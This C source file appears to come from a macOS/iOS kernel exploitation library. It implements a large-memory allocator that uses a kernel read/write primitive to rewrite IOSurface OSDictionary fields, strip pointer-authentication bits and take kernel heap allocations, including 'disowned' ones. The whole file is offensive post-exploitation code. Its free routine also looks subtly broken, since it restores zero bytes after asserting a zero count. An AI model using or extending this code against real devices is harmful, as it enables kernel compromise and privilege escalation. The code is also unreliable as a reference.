//
//  large_mem.c
//  libxe
//
//  Created by admin on 2/15/22.
//

#include <stdlib.h>
#include <stdatomic.h>

#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include "allocator/large_mem.h"
#include <macos/kernel.h>
#include "memory/kmem.h"
#include "iokit/io_surface.h"
#include "util/assert.h"
#include "util/ptrauth.h"


struct xpl_allocator_large_mem {
    IOSurfaceRef surface;
    uintptr_t    dict;
    char*        dict_memory_backup;
    uint32_t     dict_count;
};

xpl_allocator_large_mem_t xpl_allocator_large_mem_allocate(size_t size, uintptr_t* addr_out) {
    uintptr_t surface_addr;
    IOSurfaceRef surface = xpl_io_surface_create(&surface_addr);
    
    uintptr_t props_dict = xpl_kmem_read_uint64(surface_addr, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
    
    /// Capacity of dictionary required to allocate `dictionary` array of required `size`
    size_t expected_capacity = (size + 15) / 16;
    xpl_assert_cond(expected_capacity, <=, UINT32_MAX);
    
    /// `capacityIncrement` is used in `ensureCapacity` method to calculate the size of
    /// new `dictionary` array. By setting the `capacityIncrement` to `expected_capacity`,
    /// we can quickly increase the capacity of dictionary to required value by triggering the
    /// `ensureCapacity` method once. This method is much faster than growing the `dictionary`
    /// array by adding values to the dictionary
    xpl_kmem_write_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_INCREMENT_OFFSET, (uint32_t)expected_capacity);
    
    uint32_t capacity = xpl_kmem_read_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
    uint32_t count = xpl_kmem_read_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    xpl_assert_cond(capacity, >=, count);
    
    /// Trigger the `ensureCapacity` method in dictionary
    for (int i=0; i<(capacity - count + 1); i++) {
        char key[NAME_MAX];
        snprintf(key, sizeof(key), "key_%d", i);
        CFStringRef cf_key = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
        IOSurfaceSetValue(surface, cf_key, kCFBooleanTrue);
        CFRelease(cf_key);
    }
    
    uint32_t new_capacity = xpl_kmem_read_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
    xpl_assert_cond(new_capacity, ==, expected_capacity);
    uintptr_t dict_memory = xpl_ptrauth_strip(xpl_kmem_read_uint64(props_dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET));
    uint32_t new_count = xpl_kmem_read_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    
    xpl_kmem_write_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
    
    char* dict_memory_backup = malloc(new_count * 16);
    xpl_kmem_read(dict_memory_backup, dict_memory, 0, new_count * 16);
    
    xpl_allocator_large_mem_t allocator = malloc(sizeof(struct xpl_allocator_large_mem));
    allocator->surface = surface;
    allocator->dict = props_dict;
    allocator->dict_count = new_count;
    allocator->dict_memory_backup = dict_memory_backup;
    *addr_out = dict_memory;
    
    return allocator;
}

uintptr_t xpl_allocator_large_mem_allocate_disowned(size_t size) {
    uintptr_t addr;
    xpl_allocator_large_mem_t allocator = xpl_allocator_large_mem_allocate(size, &addr);
    xpl_kmem_write_uint32(allocator->dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
    xpl_kmem_write_uint32(allocator->dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET, 0);
    xpl_kmem_write_uint64(allocator->dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET, 0);
    IOSurfaceRemoveAllValues(allocator->surface);
    IOSurfaceDecrementUseCount(allocator->surface);
    free(allocator->dict_memory_backup);
    free(allocator);
    return addr;
}

void xpl_allocator_large_mem_free(xpl_allocator_large_mem_t* allocator_p) {
    xpl_allocator_large_mem_t allocator = *allocator_p;
    uint32_t current_count = xpl_kmem_read_uint32(allocator->dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    xpl_assert_cond(current_count, ==, 0);
    xpl_kmem_write(xpl_ptrauth_strip(xpl_kmem_read_uint64(allocator->dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET)), 0, allocator->dict_memory_backup, current_count * 16);
    xpl_kmem_write_uint32(allocator->dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, allocator->dict_count);
    IOSurfaceRemoveAllValues(allocator->surface);
    IOSurfaceDecrementUseCount(allocator->surface);
    free(allocator->dict_memory_backup);
    free(allocator);
    *allocator_p = NULL;
}
